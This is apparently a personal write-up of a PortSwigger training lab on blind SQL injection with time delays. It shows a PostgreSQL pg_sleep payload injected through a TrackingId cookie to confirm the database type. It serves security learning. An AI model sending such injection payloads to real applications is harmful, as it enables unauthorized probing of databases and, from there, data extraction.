# Lab: Blind SQL injection with time delays
url: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

# Overview:
- This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

- The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

- To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 

# Analysis:

Cookie: TrackingId=PFhKPNj5wYiEA3qk <OK>

Test diffirent syntaxs of 4 database server(Oracle, Microsoft, PostgreSQL and MySQL)

Cookie: TrackingId=PFhKPNj5wYiEA3qk'%3b SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- (only this delay) -> <target server is PostgreSQL>
